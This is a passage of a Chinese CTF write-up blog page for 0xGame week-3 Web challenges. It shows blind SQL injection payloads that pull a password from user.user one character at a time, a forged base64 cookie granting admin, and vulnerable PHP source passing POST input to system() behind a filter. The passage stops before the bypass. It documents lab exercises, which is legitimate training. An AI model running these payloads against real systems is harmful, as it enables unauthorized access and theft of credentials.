class="line">&#x2F;&#x2F;blind_xxx预定。。</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),10,1))&#x3D;105)# 	&#x2F;&#x2F;i</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),11,1))&#x3D;110)# 	&#x2F;&#x2F;n</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),12,1))&#x3D;100)# 	&#x2F;&#x2F;d</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),13,1))&#x3D;95)# 	&#x2F;&#x2F;_</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),14,1))&#x3D;115)# 	&#x2F;&#x2F;s</span><br><span class="line">&#x2F;&#x2F;sql_injection???</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),15,1))&#x3D;113)# 	&#x2F;&#x2F;q</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),16,1))&#x3D;108)# 	&#x2F;&#x2F;l</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),17,1))&#x3D;105)# 	&#x2F;&#x2F;i</span><br><span class="line">&#x2F;&#x2F;看起来不像有数字代替字母的操作，快进到sqlinjection？</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),18,1))&#x3D;95)# 	&#x2F;&#x2F;_</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),19,1))&#x3D;49)# 	&#x2F;&#x2F;1</span><br><span class="line">&#x2F;&#x2F;稳重，稳重。。。。这里有个数字1了</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),20,1))&#x3D;115)# 	&#x2F;&#x2F;s</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),21,1))&#x3D;95)# 	&#x2F;&#x2F;_</span><br><span class="line">&#x2F;&#x2F;blind_sql_1s。。。。。interesting？？？</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),22,1))&#x3D;110)# 	&#x2F;&#x2F;n</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),23,1))&#x3D;111)# 	&#x2F;&#x2F;o</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),24,1))&#x3D;116)# 	&#x2F;&#x2F;t</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),25,1))&#x3D;95)# 	&#x2F;&#x2F;_</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),26,1))&#x3D;104)# 	&#x2F;&#x2F;h</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),27,1))&#x3D;97)# 	&#x2F;&#x2F;a</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),28,1))&#x3D;114)# 	&#x2F;&#x2F;r</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),29,1))&#x3D;100)# 	&#x2F;&#x2F;d</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),30,1))&#x3D;125)# 	&#x2F;&#x2F;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很有精神！！！</p>
+<p>==&gt;&gt;<font color="red"><strong><em>0xGame{blind_sqli_1s_not_hard}</em></strong></font></p>
+<p>撒花留念：（另外炒回锅肉了解到还可以用**<em>Burp Suite**</em>实现半自动化注入，当然脚本应该也是存在的。。）<img src="https://i.loli.net/2021/03/17/3bKdPJ5OHstT7Bm.png" alt="image-20201028173636037"></p>
+</li>
+</ul>
+<h3 id="3-虚假留言板"><a href="#3-虚假留言板" class="headerlink" title="3. 虚假留言板"></a>3. 虚假留言板</h3><p>奇奇怪怪的改了下<strong>Cookie</strong>就做出来了。。。。。。</p>
+<p>原：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6Imtpa2kiLCJzdGF0dXMiOjF9</span><br><span class="line">Decode&#x3D;&#x3D;&gt;&gt;&#123;&quot;username&quot;:&quot;kiki&quot;,&quot;status&quot;:1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;status&quot;:1&#125;</span><br><span class="line">Encode&#x3D;&#x3D;&gt;&gt;eyJ1c2VybmFtZSI6ImFkbWluIiwic3RhdHVzIjoxfQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>发：</p>
+<p><img src="https://i.loli.net/2021/03/17/BLWvI724lPKZsiN.png" alt="image-20201028223118524"></p>
+<p>==&gt;&gt;<font color="red"><strong><em>0xGame{b3c48a2f54bb49c60a0d0841203e82be}</em></strong></font></p>
+<h3 id="4"><a href="#4" class="headerlink" title="4. ????"></a>4. <font color="red">????</font></h3><ul>
+<li><p>第一步输入：</p>
+<p>前端限制，<strong>F12</strong>删去输入框的maxlength属性及提交按钮的disabled属性。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag不在这，I prepared a shell for you : sh3ll.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第二步php过滤绕过：</p>
+<p>给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//echo &quot;flag is in fl4g_is_here.php&quot;;</span></span><br><span class="line"></span><br><span class="line">$cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-ko-z0-9]+/&quot;</span>, $cmd))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$blacklist = <span class="string">&quot;~!@#%^$&amp;\/*()（）&lt;&gt;《》-_&#123;&#125;[]&#x27;/\&quot;:,&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(str_split($blacklist) <span class="keyword">as</span> $char) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strchr($cmd, $char) !== <span class="literal">false</span>) </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Big Hacker!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由题可知需要<strong>POST</strong>发送cmd的值使得<strong>system</strong>函数成功执行，达到读取<em>flag</em>的效果，</p>
+<p>且要绕过<em>preg_match</em>函数与blacklist正则的限制。。。</p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/28/0xGame%20%E7%AC%AC%E4%BA%8C%E5%91%A8-Web/" rel="prev" title="0xGame Week2">
+      <i class="fa fa-chevron-left"></i> 0xGame Week2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/10/28/0xGame%20%E7%AC%AC%E5%9B%9B%E5%91%A8-Web(%E7%BC%BA%E4%B8%80%E9%A2%98/" rel="next" title="0xGame Week4">
+      0xGame Week4 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0xGame-%E7%AC%AC%E4%B8%89%E5%91%A8-Web"><span class="nav-number">1.</span> <span class="nav-text">0xGame 第三周-Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WriteUp-by-Casio"><span class="nav-number">1.1.</span> <span class="nav-text">WriteUp by Casio</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-inject-me"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. inject_me</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-close-eyes"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. close_eyes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%99%9A%E5%81%87%E7%95%99%E8%A8%80%E6%9D%BF"><span class="nav-number">1.1.3.</span> <span class="nav-text">3. 虚假留言板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4"><span class="nav-number">1.1.4.</span> <span class="nav-text">4. ????</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Casio3</p>
+  <div class="site-description" itemprop="description">Little trix</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Casio3</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js"></script>
+    <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/canvas_sphere.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
